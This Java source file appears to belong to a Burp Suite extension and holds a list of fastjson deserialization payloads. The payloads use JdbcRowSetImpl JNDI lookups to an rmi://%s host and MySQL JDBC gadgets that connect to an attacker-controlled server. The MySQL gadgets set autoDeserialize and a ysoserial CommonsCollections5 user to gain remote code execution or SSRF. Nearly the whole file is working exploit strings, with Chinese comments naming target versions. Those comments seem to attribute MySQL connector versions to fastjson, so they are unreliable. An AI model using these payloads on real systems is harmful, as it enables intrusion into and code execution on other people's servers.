package burp.utils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Payload {
    public static List<String> payloads = new ArrayList<>();
    public String readFile = new File("").getAbsolutePath().toString();
    static {

        payloads.add("{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s/a\",\"autoCommit\":true}}");
        payloads.add("{\"a\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://%s/a\",\"autoCommit\":true}}");

        /** fastjson5.1.x支持所有版本SSRF,但只支持5.1.11-5.1.48
         *
         */
        payloads.add("{\n" +
                "  \"@type\": \"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
                "  \"hostToConnectTo\": \"%s\",\n" +
                "  \"portToConnectTo\": 3306,\n" +
                "  \"info\": {\n" +
                "    \"user\": \"yso_CommonsCollections5_%s\",\n" +
                "    \"password\": \"pass\",\n" +
                "    \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "    \"autoDeserialize\": \"true\",\n" +
                "    \"NUM_HOSTS\": \"1\"\n" +
                "  },\n" +
                "  \"databaseToConnectTo\": \"dbname\",\n" +
                "  \"url\": \"\"\n" +
                "}");

        /** fastjson6.0.2/6.0.3(反序列化)
         *  不支持SSRF
         */
        payloads.add("\n" +
                "{\n" +
                "       \"@type\":\"java.lang.AutoCloseable\",\n" +
                "       \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\n" +
                "       \"proxy\": {\n" +
                "              \"connectionString\":{\n" +
                "                     \"url\":\"jdbc:mysql://%s:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_%s\"\n" +
                "              }\n" +
                "       }\n" +
                "}");

                /**   fastjson8.0.19(RCE) - fastjson.8.0.19>(SSRF)
                 *    特定版本8.0.19支持反序列化攻击;
                 *    版本8.0.19以上支持SSRF
                 */
        payloads.add("\n" +
                "{\n" +
                "       \"@type\":\"java.lang.AutoCloseable\",\n" +
                "       \"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\n" +
                "       \"proxy\": {\n" +
                "              \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\n" +
                "              \"connectionUrl\":{\n" +
                "                     \"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\",\n" +
                "                     \"masters\":[{\n" +
                "                            \"host\":\"\"\n" +
                "                     }],\n" +
                "                     \"slaves\":[],\n" +
                "                     \"properties\":{\n" +
                "                            \"host\":\"%s\",\n" +
                "                            \"user\":\"yso_CommonsCollections5_%s\",\n" +
                "                            \"dbname\":\"dbname\",\n" +
                "                            \"password\":\"pass\",\n" +
                "                            \"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "                            \"autoDeserialize\":\"true\"\n" +
                "                     }\n" +
                "              }\n" +
                "       }\n" +
                "}");
    }

}
